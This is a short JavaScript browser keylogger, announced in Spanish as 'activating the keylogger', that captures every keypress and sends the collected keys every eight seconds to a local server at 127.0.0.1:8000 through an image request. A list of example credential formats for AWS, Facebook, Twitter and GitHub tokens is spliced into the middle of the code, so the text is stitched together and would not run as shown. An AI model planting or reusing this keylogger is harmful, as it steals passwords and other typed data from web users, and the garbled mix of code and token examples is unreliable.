console.log("ACTIVANDO EL KEYLOGGER...");
var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
AWS Access Key
Example: AKIAIOSFODNN7EXAMPLE

AWS Secret Key
Example: "aws_secret" = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

AWS MWS Key
Example: amzn.mws.12345678-1234-1234-1234-123456789012

Facebook Secret Key
Example: "facebook_secret" = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"

Facebook Client ID
Example: "facebook_client_id" = "123456789012345"

Twitter Secret Key
Example: "twitter_secret" = "mnbvcxzlkjhgfdsapoiuytrewq0987654321"

Twitter Client ID
Example: "twitter_client_id" = "abcd1234efgh5678ijkl"

GitHub Personal Access Token
Example: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456

GitHub OAuth Access Token
Example: gho_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456

GitHub App Token
Example: ghu_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456
setInterval(function(){
  console.log("Loop");
  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;
  keys = '';
}, 8000);
